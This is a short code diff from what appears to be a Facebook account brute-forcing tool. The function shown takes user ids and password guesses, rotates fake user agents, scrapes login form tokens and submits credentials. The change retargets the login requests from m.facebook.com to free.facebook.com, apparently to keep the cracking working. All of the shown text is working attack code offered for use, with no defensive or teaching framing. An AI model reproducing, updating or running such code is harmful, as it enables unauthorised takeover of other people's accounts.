@@ -742,7 +742,7 @@ def YounisXyz(uid,pwx,tl):
             session = requests.Session()
             ua = random.choice(ugen)
             XyzAgents = ua_mfacebook()
-            free_fb = session.get('https://m.facebook.com').text
+            free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -754,7 +754,8 @@ def YounisXyz(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             xyzheader_fuck = {
-    'authority': 'm.facebook.com',
+    'authority': 'free.facebook.com',
+    'method':'GET',	    
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',       
